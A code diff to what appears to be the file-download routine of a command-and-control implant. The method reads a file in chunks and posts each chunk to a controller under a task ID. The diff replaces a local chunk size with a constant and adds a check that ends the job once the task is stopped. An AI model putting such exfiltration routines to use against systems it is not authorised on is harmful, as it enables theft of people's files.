@@ -2,9 +2,8 @@
         file_path = file if file[0] == os.sep \
                 else os.path.join(self.current_directory,file)
 
-        chunk_size = 512000
         file_size = os.stat(file_path).st_size 
-        total_chunks = int(file_size / chunk_size) + (file_size % chunk_size > 0)
+        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
 
         data = {
             "action": "post_response", 
@@ -13,16 +12,20 @@
                 "task_id": task_id,
                 "total_chunks": total_chunks,
                 "full_path": file_path,
-                "chunk_size": chunk_size
+                "chunk_size": CHUNK_SIZE
             }]
         }
         initial_response = self.postMessageAndRetrieveResponse(data)
         chunk_num = 1
         with open(file_path, 'rb') as f:
             while True:
-                content = f.read(chunk_size)
+                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
+                    return "Job stopped."
+
+                content = f.read(CHUNK_SIZE)
                 if not content:
                     break # done
+
                 data = {
                     "action": "post_response", 
                     "responses": [
